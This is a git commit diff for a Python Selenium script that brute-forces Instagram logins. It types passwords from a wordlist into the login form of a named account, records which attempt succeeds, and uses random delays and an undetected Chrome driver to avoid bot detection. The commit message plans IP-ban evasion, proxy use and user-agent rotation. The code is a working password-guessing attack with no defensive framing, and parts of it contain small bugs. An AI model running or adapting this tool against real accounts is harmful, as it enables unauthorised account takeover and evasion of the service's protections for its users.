a72ddb7e209050f6de09c6bb0d8dd38acee92620
TimCauss <t.caussignac@gmail.com>
2023-09-04 15:33:44 +0200

    Main loop OK Next : avoiding ban IP, make driver more undetectable, use proxy, rotate http header info and user-agent, see if accepting cookies make the bot more trusted

--- testcases/loginloop.py
+++ testcases/loginloop.py
@@ -1,24 +1,35 @@
+import random
+
 import undetected_chromedriver as uc
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from selenium.webdriver import Keys
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 
-import datetime
-import os
+import time
 import logging
 
-ct = datetime.datetime.now()
+FORMAT = '%(asctime)s - %(levelname)s:%(message)s'
+streamformat = logging.Formatter("%(asctime)s - %(levelname)s:%(message)s'")
+logging.basicConfig(filename='info.log', filemode='w', encoding='utf-8', level=logging.INFO, format=FORMAT,
+                    datefmt="%H:%M:%S")
 
-FORMAT = '%(asctime)s %(message)s'
-
-logging.basicConfig(filename='info.log', encoding='utf-8', level=logging.INFO, format=FORMAT)
-
-# Variable de fonctionnement
+#
+# UNDETECTED chromedriver var
+#
 driver = uc.Chrome()
 
 connexion_url = 'https://www.instagram.com/accounts/login/'
-account = '0669505991'
+account = 'Tim0ut_13'
 file_path = 'test.txt'
+
+count = 0
+
+
+def fake_time_wait(min=0.2, max=1.1):
+    t = random.uniform(min, max)
+    time.sleep(t)
+    print(f'Time waited: {t}')
 
 
 def file_to_list(path):
@@ -33,8 +44,15 @@ def read_words(lines):
         yield word
 
 
+def check_element_by_text(text):
+    try:
+        driver.find_element(By.XPATH, "//*[text()=" + text)
+        return True
+    except NoSuchElementException as ex:
+        return False
+
+
 def navigate_to_home():
-    # configuration du timeout
     timeout_time = 0.5
     driver.implicitly_wait(timeout_time)
 
@@ -45,30 +63,72 @@ def navigate_to_home():
         logging.error(f'Connexion timeout ({ex})')
         driver.close()
 
-
     try:
+        fake_time_wait()
         cookie_reject_btn = driver.find_element(By.XPATH, "//*[text()='Refuser les cookies optionnels']")
         cookie_reject_btn.click()
     except NoSuchElementException as ex:
         logging.info(f'Cookies message not found ({ex})')
+    login_loop()
 
-    input('PAUSE')
+
+def login_loop():
+    fake_time_wait()
+    username_input = driver.find_element(By.NAME, 'username')
+    password_input = driver.find_element(By.NAME, 'password')
+    connect_btn = driver.find_element(By.XPATH,
+                                      "/html/body/div[2]/div/div/div[2]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[3]/button/div")
 
     try:
-        driver.find_element(By.NAME, 'username').send_keys(account)
+        logging.info(f'Logging to account : {account}')
+        username_input.send_keys('')
+        fake_time_wait()
+        username_input.send_keys(account)
     except NoSuchElementException as ex:
-        logging.error(f'Username input not found ({ex})')
+        logging.error(f'Username input not found')
+        logging.error(f'{ex}')
         driver.close()
 
+    for password in read_words(file_to_list(file_path)):
 
+        try:
+            logging.info(f"Trying password : {password}")
+            fake_time_wait()
+            password_input.send_keys(password)
+        except NoSuchElementException as ex:
+            logging.error(f'Password input not found')
+            logging.error(f'{ex}')
+            driver.close()
 
-    input('PAUSE')
-    exit()
-    logging.info(f'Logging to account : {account}')
+        try:
+            time.sleep(1)
+            connect_btn.click()
+        except NoSuchElementException as ex:
+            logging.error(f'Connexion button not found')
+            logging.error(f'{ex}')
+            driver.close()
+
+        try:
+            global count
+            count += 1
+            time.sleep(2)
+            password_msg = driver.find_element(By.CLASS_NAME, "_ab2z")
+
+            if password_msg.is_displayed():
+                logging.info(f'Trying {count} - Wrong password : {password}')
+                print(f'Trying {count} - Wrong password : {password}')
+                time.sleep(0.3)
+                for _ in range(len(password[0]) + 1):
+                    print(f'{_}')
+                    password_input.send_keys(Keys.BACKSPACE)
+                fake_time_wait()
+            else:
+                logging.info(f'Trying {count} - CORRECT : {password}')
+                print(f'Trying {count} - CORRECT : {password}')
+
+        except Exception as ex:
+            logging.error(f'Error entering password.')
+            logging.error(f'{ex}')
 
 
 navigate_to_home()
-
-
-for word in read_words(file_to_list(file_path)):
-    print(word)
